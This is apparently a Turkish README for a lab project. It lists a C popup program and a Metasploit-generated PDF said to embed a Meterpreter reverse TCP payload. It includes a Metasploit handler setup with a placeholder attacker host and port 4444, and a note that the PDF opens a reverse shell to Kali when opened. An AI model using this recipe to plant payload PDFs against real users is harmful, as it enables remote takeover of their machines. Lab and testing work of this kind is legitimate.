# ⚙️ Popup ve Payload Uygulaması

Bu proje, C diliyle yazılmış bir **popup mesajı çıkaran Windows uygulamasını** ve  
bununla birlikte kullanılan PDF dosyalarını içerir. Ayrıca, zararlı içerik içeren bir PDF dosyası da Metasploit ile test amaçlı üretilmiştir.

---

## 📁 Proje Dosyaları

| Dosya Adı           | Açıklama                                                                 |
|---------------------|--------------------------------------------------------------------------|
| `popup.c`           | C dili ile yazılmış mesaj kutusu çıkaran kaynak kod                      |
| `popup.exe`         | Derlenmiş çalıştırılabilir uygulama (Windows için)                       |
| `popup_2.pdf`       | Test amaçlı, boş veya örnek bir PDF dosyası                              |
| `kapsullu_pdf.pdf`  | Metasploit ile oluşturulmuş, içine payload gömülü zararlı PDF örneği     |

---

## 🚀 Uygulama Kullanımı

### Popup Uygulaması:
- `popup.exe` çift tıklanarak çalıştırıldığında ekrana uyarı mesajı çıkar:


### Derlemek için:
Kali Linux üzerinde şu komut ile derlenmiştir:

```bash
x86_64-w64-mingw32-gcc popup.c -o popup.exe

☣️ Zararlı PDF Bilgisi (Metasploit)
kapsullu_pdf.pdf, windows/meterpreter/reverse_tcp payload'ı gömülerek oluşturulmuştur.

Kullanım örneği:

bash
Kopyala
Düzenle
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <Kali_IP>
set LPORT 4444
run
Açıldığında Kali’ye ters bağlantı gönderir.

⚠️ Bu dosya sadece laboratuvar/test ortamlarında kullanılmalıdır.